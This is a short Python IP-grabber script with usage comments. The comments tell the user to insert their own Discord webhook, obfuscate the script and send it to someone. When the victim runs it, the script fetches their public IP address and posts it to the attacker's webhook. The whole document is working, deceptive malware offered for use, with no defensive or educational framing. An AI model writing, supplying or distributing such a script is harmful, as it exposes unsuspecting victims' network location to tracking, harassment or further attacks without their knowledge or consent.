#How to use
#1. Replace "YOURWEBHOOK" with your discord webhook.
#2. Send the script to someone and when they run it, it will send their IP to your webhook, (OBF it)

from requests import get
from discord_webhook import DiscordWebhook

ip = get('https://api.ipify.org').content.decode('utf8')

webhook = DiscordWebhook(url='YOUrWEBHOOK',
                         content='Their Public IP Address Is: {}'.format(ip))
response = webhook.execute()
